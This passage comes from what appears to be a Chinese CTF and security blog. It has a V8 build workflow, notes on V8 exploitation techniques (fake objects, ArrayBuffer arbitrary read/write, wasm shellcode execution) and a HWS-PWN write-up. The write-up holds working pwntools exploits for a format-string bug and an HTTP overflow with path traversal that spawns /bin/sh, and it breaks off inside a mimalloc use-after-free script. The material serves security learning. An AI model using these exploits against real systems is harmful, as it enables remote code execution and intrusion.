class="hljs-string"></span>    <br>    <span class="hljs-comment"># get depot_tools</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">depot_tools</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="hljs-string">        echo export PATH=\&quot;\$PATH:`pwd`/depot_tools/\&quot; &gt;&gt; ~/.bash_profile</span><br><span class="hljs-string"></span>    <br>    <span class="hljs-comment"># fetch v8 source code</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">fetch</span> <span class="hljs-string">v8</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        source ~/.bash_profile</span><br><span class="hljs-string">        fetch v8</span><br><span class="hljs-string"></span>    <br>    <span class="hljs-comment"># patch source code</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">patch</span> <span class="hljs-string">v8</span><br>      <span class="hljs-attr">if:</span> <span class="hljs-string">env.PATCH_FLAG</span> <span class="hljs-string">==</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-type">!cancelled()</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        cd v8</span><br><span class="hljs-string">        git reset --hard $COMMIT</span><br><span class="hljs-string">        cd ..</span><br><span class="hljs-string"></span>        <br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">build</span> <span class="hljs-string">v8</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        source ~/.bash_profile</span><br><span class="hljs-string">        cd v8</span><br><span class="hljs-string">        gclient sync -f</span><br><span class="hljs-string">        ./tools/dev/v8gen.py x64.release</span><br><span class="hljs-string">        ninja -C out.gn/x64.release</span><br><span class="hljs-string">        ./tools/dev/v8gen.py x64.debug</span><br><span class="hljs-string">        ninja -C out.gn/x64.debug</span><br><span class="hljs-string">        cd ..</span><br><span class="hljs-string"></span>        <br>    <span class="hljs-comment"># zip d8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">7zip</span> <span class="hljs-string">v8_src</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        mkdir d8</span><br><span class="hljs-string">        cp -R v8/out.gn d8</span><br><span class="hljs-string">        cp -R v8/src d8</span><br><span class="hljs-string">        cp -R v8/tools d8</span><br><span class="hljs-string">        zip -q -r v8.zip d8</span><br><span class="hljs-string"></span>    <br>    <span class="hljs-comment"># upload v8.zip</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">upload</span> <span class="hljs-string">v8_src</span><br>      <span class="hljs-attr">if:</span> <span class="hljs-string">env.DEPOT_UPLOAD</span> <span class="hljs-string">==</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-type">!cancelled()</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        wget https://github.com/Mikubill/transfer/releases/download/v0.4.17/transfer_0.4.17_linux_amd64.tar.gz</span><br><span class="hljs-string">        tar -xzvf  transfer_0.4.17_linux_amd64.tar.gz</span><br><span class="hljs-string">        ./transfer wss --block 2621440 -s -p 64 --no-progress v8.zip 2&gt;&amp;1 | tee cowtransfer.log</span><br><span class="hljs-string">        echo &quot;::warning file=wenshushu.cn::$(cat cowtransfer.log | grep https)&quot;</span><br></code></pre></td></tr></table></figure><p>â€‹                                                               </p><h3 id="V8æºç åˆ†æ"><a href="#V8æºç åˆ†æ" class="headerlink" title="V8æºç åˆ†æ"></a>V8æºç åˆ†æ</h3><p>æœ¬äººå¾ˆèœï¼Œç°åœ¨åªèƒ½å¯¹builtins-array.ccä¸­å¸¸è§çš„å‡½æ•°è¿›è¡Œä¸€äº›æ€»ç»“ã€‚</p><p>builtins-array.ccæ˜¯JavaScript æ•°ç»„æ“ä½œç›¸å…³çš„å†…ç½®å‡½æ•°çš„å®ç°ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// è·å–ä¼ å…¥å‚æ•°ä¸ªæ•°</span><br>uint32_t len = args.length<span class="hljs-literal">()</span>;<br><br><span class="hljs-comment">// è·å–æ•°ç»„çš„å½“å‰é•¿åº¦ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸º uint32_t ç±»å‹ã€‚</span><br>uint32_t len = static_cast&lt;uint32_t&gt;(<span class="hljs-built_in">array</span>-&gt;length<span class="hljs-literal">()</span>.<span class="hljs-constructor">Number()</span>);<br><br><span class="hljs-comment">// å°†argsçš„ç¬¬äºŒä¸ªå‚æ•°è½¬æ¢ä¸ºæ•°å­—ç±»å‹ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ result ä¸­ã€‚</span><br><span class="hljs-constructor">ASSIGN_RETURN_FAILURE_ON_EXCEPTION(<span class="hljs-params">isolate</span>, <span class="hljs-params">result</span>, Object::ToNumber(<span class="hljs-params">isolate</span>, <span class="hljs-params">args</span>.<span class="hljs-params">at</span>&lt;Object&gt;(1)</span>));<br><br><span class="hljs-comment">// å°†æ•°ç»„ä¸­çš„ç‰¹å®šç´¢å¼•ä½ç½®çš„å…ƒç´ è®¾ç½®ä¸ºç»è¿‡è½¬æ¢çš„æ•°å­—å€¼</span><br>elements.set(idx, value-&gt;<span class="hljs-constructor">Number()</span>);<br><br><span class="hljs-comment">//ä» elementsä¸­è·å–lengthçš„ç´¢å¼•ä½ç½®çš„å…ƒç´ </span><br>*(isolate-&gt;factory<span class="hljs-literal">()</span>-&gt;<span class="hljs-constructor">NewNumber(<span class="hljs-params">elements</span>.<span class="hljs-params">get_scalar</span>(<span class="hljs-params">length</span>)</span>))<br></code></pre></td></tr></table></figure><p>å…·ä½“é¢˜ç›®ï¼š<a href="https://www.freebuf.com/vuls/203721.html">starctf2019-oob</a>ã€<a href="https://xz.aliyun.com/t/6577">æ•°å­—ç»æµ-final-browser</a></p><p>â€‹                                         </p><h3 id="V8æ¼æ´åˆ©ç”¨"><a href="#V8æ¼æ´åˆ©ç”¨" class="headerlink" title="V8æ¼æ´åˆ©ç”¨"></a>V8æ¼æ´åˆ©ç”¨</h3><h4 id="addressOfå’ŒfakeObject"><a href="#addressOfå’ŒfakeObject" class="headerlink" title="addressOfå’ŒfakeObject"></a>addressOfå’ŒfakeObject</h4><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_array = [obj];<br><span class="hljs-keyword">var</span> float_array = [<span class="hljs-number">1.1</span>];<br></code></pre></td></tr></table></figure><p>obj_arrayæ•°ç»„ä¸­å­˜å‚¨çš„æ˜¯objçš„åœ°å€ï¼Œfloat_arrayæ•°ç»„ä¸­å­˜å‚¨çš„æ˜¯æµ®ç‚¹æ•°ï¼Œv8å®Œå…¨ä¾èµ–mapç±»å‹å¯¹jså¯¹è±¡è¿›è¡Œè§£æã€‚å¦‚æœå¯ä»¥ä¿®æ”¹obj_arrayçš„mapä¸ºfloat_arrayçš„mapï¼Œå†å»ä½¿ç”¨obj_array[0]æ˜¯å»æŒ‰æµ®ç‚¹æ•°å»å–å€¼ï¼ŒåŸæ¥çš„å€¼æ˜¯objçš„åœ°å€ï¼Œæœ€åä»¥æµ®ç‚¹æ•°çš„å½¢å¼æ³„æ¼åœ°å€ï¼›åŒæ ·å¦‚æœå¯ä»¥ä¿®æ”¹float_arrayçš„mapä¸ºobj_arrayçš„mapï¼Œå†å»ä½¿ç”¨float_array[0]æ˜¯å»æŒ‰å¯¹è±¡åœ°å€å»å–å€¼ï¼ŒåŸæ¥çš„å€¼æ˜¯æµ®ç‚¹æ•°ï¼Œæœ€åä»¥16è¿›åˆ¶çš„IEEE754æ•°ä¸ºåœ°å€å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œå½“ç„¶è¿™ä¸ªåœ°å€ä¸åœ°å€ä¸­çš„å†…å®¹éœ€è¦æå‰æ„é€ å¥½ã€‚</p><h4 id="åˆ©ç”¨ArrayBufferå»ä»»æ„è¯»å†™"><a href="#åˆ©ç”¨ArrayBufferå»ä»»æ„è¯»å†™" class="headerlink" title="åˆ©ç”¨ArrayBufferå»ä»»æ„è¯»å†™"></a>åˆ©ç”¨ArrayBufferå»ä»»æ„è¯»å†™</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">var data_buf = new ArrayBuffer(<span class="hljs-number">48</span>)<span class="hljs-comment">;</span><br>%DebugPrint(obj)<span class="hljs-comment">;</span><br>%SystemBreak()<span class="hljs-comment">;</span><br>pwndbg&gt; tele <span class="hljs-number">0x7d9b1b8e748</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚  <span class="hljs-number">0x7d9b1b8e748</span> â€”â–¸ <span class="hljs-number">0x1c5bac984371</span> â—‚â€” <span class="hljs-number">0x80000055d5b5822</span>  (map)<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>â”‚  <span class="hljs-number">0x7d9b1b8e750</span> â€”â–¸ <span class="hljs-number">0x55d5b582cf1</span> â—‚â€” <span class="hljs-number">0x55d5b5828</span> <br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>â”‚  <span class="hljs-number">0x7d9b1b8e758</span> â€”â–¸ <span class="hljs-number">0x55d5b582cf1</span> â—‚â€” <span class="hljs-number">0x55d5b5828</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>â”‚  <span class="hljs-number">0x7d9b1b8e760</span> â—‚â€” <span class="hljs-number">0x30</span> /* <span class="hljs-string">&#x27;0&#x27;</span> */  (byte_length)<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>â”‚  <span class="hljs-number">0x7d9b1b8e768</span> â€”â–¸ <span class="hljs-number">0x55e3856e4f90</span> â—‚â€” <span class="hljs-number">0x0</span> (backing_store)<br></code></pre></td></tr></table></figure><p>BackingStoreåœ°å€æ˜¯ç”³è¯·å †ä¸Šçš„ä¸€æ®µå†…å­˜ï¼Œæ˜¯çœŸæ­£å†™å…¥æ•°æ®çš„åœ°å€ï¼Œå¦‚æœä¿®æ”¹BackingStoreæŒ‡é’ˆï¼Œé‚£ä¹ˆå°±å¯ä»¥è·å¾—ä»»æ„è¯»å†™çš„èƒ½åŠ›äº†ã€‚</p><p>å½“ç„¶è¦æƒ³ä»»æ„è¯»å†™çš„å‰ææ˜¯å…ˆæ³„æ¼ä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œå†ä¿®æ”¹BackingStoreæŒ‡é’ˆï¼Œå¦‚æœV8ä½¿ç”¨äº†æŒ‡é’ˆå‹ç¼©ï¼Œå°†æŒ‡é’ˆçš„æœ‰æ•ˆä½æ•°å‡å°‘åˆ°32ä½æˆ–æ›´å°‘ï¼Œè™½ç„¶å¯¹BackingStoreæŒ‡é’ˆæ²¡æœ‰å½±å“ï¼Œä½†æ˜¯å‰é¢æåˆ°çš„obj_arrayä¸­å­˜çš„ä¼šæ˜¯ä¸€ä¸ª32ä½åœ°å€ï¼ˆå°†é«˜32ç›´æ¥å»æ‰ï¼Œåªä¿ç•™ä½32ä½ï¼‰ï¼Œè¿™æ ·æ— æ³•æ³„æ¼å®Œæ•´çš„åœ°å€ã€‚</p><h4 id="ä¼ªé€ map"><a href="#ä¼ªé€ map" class="headerlink" title="ä¼ªé€ map"></a>ä¼ªé€ map</h4><p>æœ‰æ—¶å¦‚æœæ²¡æ³•æ³„æ¼mapåœ°å€ï¼Œæ˜¯å¯ä»¥ç›´æ¥ä¼ªé€ map</p><p>å…·ä½“é¢˜ç›®ï¼š<a href="https://eternalsakura13.com/2019/04/29/v9/">34c3 v9</a></p><h4 id="wasmæ‰§è¡Œshellcode"><a href="#wasmæ‰§è¡Œshellcode" class="headerlink" title="wasmæ‰§è¡Œshellcode"></a>wasmæ‰§è¡Œshellcode</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> wasmCode = new Uint8Array([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<br>    <span class="hljs-attribute">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-attribute">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<br>    <span class="hljs-attribute">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-attribute">var</span> wasmModule = new WebAssembly.Module(wasmCode);<br><span class="hljs-attribute">var</span> wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);<br><span class="hljs-attribute">var</span> f = wasmInstance.exports.main;<br></code></pre></td></tr></table></figure><p>ç»“åˆå…¶å®ƒæ¼æ´å°†åŸæœ¬å†…å­˜ä¸­çš„çš„wasmä»£ç æ›¿æ¢ä¸ºshellcodeï¼Œå½“åç»­è°ƒç”¨få‡½æ•°æ—¶ï¼Œå®é™…ä¸Šè°ƒç”¨çš„å°±æ˜¯shellcodeã€‚</p><p>å…ˆå¾—åˆ°få‡½æ•°çš„åœ°å€ï¼Œé€šè¿‡shared_infoâ€“&gt;WasmExportedFunctionDataâ€“&gt;Instanceè¿™ä¸€ç³»åˆ—å…³ç³»ï¼Œæœ€ååœ¨Instanceçš„å›ºå®šåç§»å¤„ï¼ˆä¸åŒV8ç‰ˆæœ¬åç§»æ˜¯ä¸åŒçš„ï¼‰ï¼Œå°±èƒ½è¯»å–åˆ°å­˜å‚¨wasmä»£ç çš„å†…å­˜é¡µèµ·å§‹åœ°å€ï¼Œè¿™ä¸ªå†…å­˜é¡µæ˜¯RWXæ®µå¹¶ä¸”æ˜¯é¡µå¯¹é½çš„ã€‚å¦‚æœç›´æ¥å¯ä»¥å¾—åˆ°wasmInstanceçš„åœ°å€å°±ä¸ç”¨ä¸Šè¿°éº»çƒ¦åŠæ³•ï¼Œå…¶å®Instanceçš„åœ°å€å°±æ˜¯wasmInstanceçš„åœ°å€ã€‚</p><p>å¯¹äºä¸€äº›ä½ç‰ˆæœ¬çš„V8ï¼ŒRWXæ®µæ˜¯å¯ä»¥ç›´æ¥åœ¨få‡½æ•°çš„åœ°å€çš„åç§»å¤„æ‰¾åˆ°çš„ï¼ˆå…·ä½“é¢˜ç›®ï¼š<a href="https://eternalsakura13.com/2019/04/29/v9/">34c3 v9</a>ï¼‰</p><img src="/img/17/Screenshot 2023-09-11 155203.png" style="zoom:50%;" /><p>â€‹                      </p><p>ä¹Ÿæœ‰shared_infoä¸­æ²¡æœ‰WasmExportedFunctionDataçš„è¿™ç§æƒ…å†µï¼ˆè¿˜ä¸æ¸…æ¥šæ˜¯ä»€ä¹ˆåŸå› ï¼Œå…·ä½“é¢˜ç›®ï¼š<a href="https://xz.aliyun.com/t/5190">PlaidCTF roll a d8</a>ï¼‰</p><img src="/img/17/Screenshot 2023-09-11 160507.png" style="zoom:50%;" />]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HWS-PWN</title>
    <link href="/2023/07/17/HWS-PWN/"/>
    <url>/2023/07/17/HWS-PWN/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æœ‰å¹¸èƒ½å°†ä¸‰é“pwné¢˜éƒ½è§£å‡ºäº†ï¼Œç¬¬ä¸€å¤©ä¸Šå¤§åˆ†ï¼Œä½†åªä¼šè§£pwnï¼Œç¬¬äºŒå¤©ä¸æ–­æ‰åˆ†ğŸ˜¢ã€‚</p><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>ç™½ç»™çš„ä¸¤æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæœ€åæ”¹__libc_start_mainä¸ºone_gangetå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;fmt&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./fmt&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30050</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;%18$p,%21$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xe3b01</span><br>fmt_payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack + <span class="hljs-number">8</span>) : one_gadget &amp; <span class="hljs-number">0xffffff</span>&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>payload = fmt_payload[:<span class="hljs-number">7</span>] + <span class="hljs-string">b&#x27;hh&#x27;</span> + fmt_payload[<span class="hljs-number">9</span>:]<br><span class="hljs-comment"># print(fmt_payload)</span><br><span class="hljs-comment"># print(payload)</span><br><span class="hljs-comment"># print(hex(one_gadget))</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                               </p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>è™½ç„¶é™åˆ¶äº†<code>..</code> ç¬¦å·çš„ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨sub_1766å‡½æ•°ä¸­æœ‰ä¸ªè½¬base64çš„æ“ä½œï¼Œå¤§å°æ²¡æœ‰é™åˆ¶ï¼Œå¯ä»¥ç›´æ¥æº¢å‡ºåˆ°haystackï¼Œå†åˆ©ç”¨<code>?</code> å»ç»•è¿‡æ–‡ä»¶åç¼€åçš„æ£€æµ‹ï¼Œæœ€ååˆ©ç”¨sub_2993å‡½æ•°ä¸­çš„execlå»æ‰§è¡Œ<code>/bin/sh</code></p><img src="/img/16/Screenshot 2023-07-16 122048.png" style="zoom:80%;" /><p>â€‹                              </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#p = remote(&#x27;127.0.0.1&#x27;, 4000)</span><br>p = remote(<span class="hljs-string">&#x27;123.60.179.52&#x27;</span>,<span class="hljs-number">30092</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span><br>msg = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;/../../../bin/sh?faker.js&#x27;</span><br>payload += <span class="hljs-string">b&#x27;Authorization: Basic &#x27;</span> + base64.b64encode(msg) + <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br>pause()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                                         </p><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>ç™½ç»™çš„uafï¼Œä¸»è¦æ˜¯mimallocçš„é—®é¢˜ï¼Œéšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œå †åˆ†é…æ˜¯å°†ä¸€å—è¿ç»­çš„å†…å­˜ï¼ˆ0x10000ï¼‰åˆ’åˆ†ä¸ºç›¸åŒçš„å¤§å°çš„chunkï¼Œæœ‰ç‚¹åƒslabã€‚</p><p>ä¸glibcä¸åŒï¼ŒåŒä¸€å¤§å°çš„å †å—åˆ†é…chunkçš„é“¾è¡¨å’Œé‡Šæ”¾chunkçš„é“¾è¡¨æ˜¯ä¸åŒçš„ï¼Œåªæœ‰å½“åˆ†é…chunkçš„é“¾è¡¨ä¸­çš„chunkç”¨å°½äº†ï¼Œæ‰å»ä½¿ç”¨é‡Šæ”¾chunkçš„é“¾è¡¨ï¼ˆè¯­è¨€è¡¨è¿°å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œå¦‚æœæ²¡æœ‰getåˆ°æˆ‘è¯´çš„ç‚¹ï¼Œå°±å¤šè°ƒè¯•ä¸€ä¸‹å§ï¼‰ã€‚</p><img src="/img/16/Screenshot 2023-07-16 125025.png" style="zoom:80%;" /><p>å…ˆæ³„æ¼å †åœ°å€ï¼Œåœ¨å †åŸºå€+0x240å¤„æœ‰libmimalloc.so.2çš„åœ°å€ï¼Œåç§»ä¸glibcå›ºå®šï¼Œæ³„æ¼åæ”¹IO_2_1_stdoutï¼Œåˆ©ç”¨house of catå»æ ˆè¿ç§»ã€‚</p><p>libmimalloc.so.2å’Œglibcçš„åç§»æœ¬åœ°å’Œè¿œç¨‹ä¸ä¸€æ ·ï¼Œè¿˜è¦å»çˆ†ç ´è¿™ä¸ªåç§»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = remote(&#x27;60.204.140.184&#x27;,30175)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><br><span 